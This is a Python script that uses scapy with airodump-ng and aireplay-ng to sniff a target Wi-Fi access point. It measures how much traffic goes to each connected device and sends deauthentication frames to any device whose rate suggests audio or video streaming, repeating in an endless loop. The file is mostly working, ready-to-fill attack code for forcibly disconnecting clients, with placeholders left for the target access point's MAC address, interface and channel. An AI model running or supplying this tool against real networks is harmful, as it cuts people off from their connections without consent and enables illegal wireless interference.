#import the libraries needed
from scapy.all import *
import time
import signal
import subprocess

#globals
connected_devices = {}
iteration = 0

#the access point and interface we are monitoring
default_access_point = 'INSERT ACCESS POINT MAC ADDRESS'
interface_name = 'INSERT INTERFACE NAME'

#Input: a captured packet
#Output: none
#Description: this function takes in a captured packet and determines if it is a data packet going to a device connected to the access point. If so, the packet's size is added to whichever device it is being sent to
def process(packet):
    #find and store the size of the packet
    packet_size = len(packet)
    
    #if the packet is a wifi packet, determine if it is a data packet that is going to a device, not from a device
    if packet.haslayer(Dot11):
   	 if packet.type == 2 and packet.FCfield & 0x2:
   	 
   		 #determine the address the packet is going to
   		 mac_address = packet.addr1.upper()
   		 
   		 #if the address is already in our connected_devices dictionary, then add the size of the packet to that entry. If not, create an entry for that device and set it's size equal to the size of the packet
   		 if mac_address in connected_devices:
   			 connected_devices[mac_address]['cumulative_size'] += packet_size
   		 else:
   			 connected_devices[mac_address] = {
   				 'cumulative_size':packet_size
   			 }
    #determine if the packet is an IP packet
    elif packet.haslayer(IP):
   	 dst_ip = packet[IP].dst

   	 #if the address is already in our connected_devices dictionary, then add the size of the packet to that entry. If not, create an entry for that device and set it's size equal to the size of the packet
   	 if dst_ip in connected_devices:
   		 connected_devices[dst_ip]['cumulative_size'] += packet_size
   	 else:
   		 connected_devices[dst_ip] = {
   			 'cumulative_size':packet_size
   		 }
   		 
#Input: nothing
#Output: nothing
#Description: make a prediction of the activity of each device connected to the access point and recieving data from it based on its rate. Deauthenticate the device if the rate is too great, indicating video or audio activity   			 
def predict():
    #for each device in the list, find the size of the cumulative packets sent to that device in the last 10 seconds. Reset the cumulative size to 0 after storing that value
    for address in connected_devices:
   	 rate = connected_devices[address]['cumulative_size']
   	 connected_devices[address]['cumulative_size'] = 0
   	 
   	 #if the rate is greater than this threashold value, the activity is likely video or audio. Deauthenticate the device if it is engaging in video or audio activity. Otherwise, do nothing.
   	 if rate > 200000:
   		 print(f"Video or audio activity detected at {address}")
   		 deauthenticate(address, default_access_point, interface_name)
   	 else:
   		 print(f"No video or audio activity detected at {address}")

#Input: MAC address of the device to deauthenticate, access point the device is connected to, the interface the device is on
#Output: nothing
#Description: Call an aircrack command to deauthenticate the specified device
def deauthenticate(device_address, access_point, interface):
    subprocess.Popen(['sudo', 'aireplay-ng', '--deauth', '1', '-a', access_point, '-c', device_address, interface])
    
if __name__ == "__main__":
    #remove all previous output files
    subprocess.Popen('rm output*', shell=True)

    #continuous monitoring process
    while True:
   	 #first, begin the monitoring process on a specific access point and interface using aircrack via a terminal command. Write each captured packet to an output file
   	 p = subprocess.Popen(['sudo', 'airodump-ng', 'INSERT INTERFACE NAME', '--bssid', 'INSERT ACCESS POINT MAC ADDRESS', '-c', 'INSERT CHANNEL NUMBER', '-w', 'output'])
   	 #Collect packets for 10 seconds
   	 time.sleep(10)
   	 #terminate the monitoring
   	 p.terminate()
   	 p.wait()
   	 #get all of the packets from the produced output file and process them
   	 sniff(offline="output-01.cap", prn=process)
   	 #predict the activity of the devices connected to the access point and deauthenticate them based on the predictions
   	 predict()
   	 #remove the output file
   	 subprocess.Popen('rm output*', shell=True)
   	 
